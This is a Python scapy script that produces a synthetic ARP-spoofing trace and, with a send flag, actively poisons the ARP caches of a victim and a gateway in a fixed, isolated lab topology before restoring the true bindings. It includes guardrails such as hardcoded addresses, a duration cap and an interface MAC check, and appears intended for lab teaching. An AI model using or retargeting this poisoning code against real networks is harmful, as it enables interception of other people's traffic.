"""Create an offline ARP trace, or poison only the fixed isolated CYL57 topology."""
import argparse
import time
from scapy.all import ARP, Ether, get_if_hwaddr, sendp, wrpcap

VICTIM_IP, GATEWAY_IP = "10.57.0.2", "10.57.0.1"
VICTIM_MAC, GATEWAY_MAC = "02:00:00:57:00:02", "02:00:00:57:00:01"
ATTACKER_MAC = "02:00:00:57:00:03"


def reply(destination_mac, destination_ip, claimed_ip, claimed_mac):
    return Ether(src=claimed_mac, dst=destination_mac) / ARP(
        op=2, hwsrc=claimed_mac, psrc=claimed_ip,
        hwdst=destination_mac, pdst=destination_ip)


def poison_packets():
    return [reply(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, ATTACKER_MAC),
            reply(GATEWAY_MAC, GATEWAY_IP, VICTIM_IP, ATTACKER_MAC)]


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--send", action="store_true", help="Use only inside the provided namespace lab")
    parser.add_argument("--interface", default="eth0")
    parser.add_argument("--duration", type=int, default=15)
    args = parser.parse_args()
    if not 1 <= args.duration <= 60:
        parser.error("Duration must be between 1 and 60 seconds.")
    poison = poison_packets()
    restore = [reply(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, GATEWAY_MAC),
               reply(GATEWAY_MAC, GATEWAY_IP, VICTIM_IP, VICTIM_MAC)]
    # Synthetic sequence: true binding -> conflicting claim -> true binding restored.
    wrpcap("arp-demo.pcap", [restore[0], *poison, *restore])
    print("Wrote arp-demo.pcap: synthetic ARP sequence, not intercepted traffic.")
    if args.send:
        if get_if_hwaddr(args.interface).lower() != ATTACKER_MAC:
            parser.error("Interface must have the isolated lab attacker's fixed MAC address.")
        try:
            for _ in range(args.duration):
                sendp(poison, iface=args.interface, verbose=False)
                time.sleep(1)
        finally:
            # Keep the bridge from learning genuine peer MACs on the attacker port.
            corrections = [Ether(src=ATTACKER_MAC, dst=p[Ether].dst) / p[ARP] for p in restore]
            sendp(corrections, iface=args.interface, count=3, inter=0.2, verbose=False)


if __name__ == "__main__":
    main()
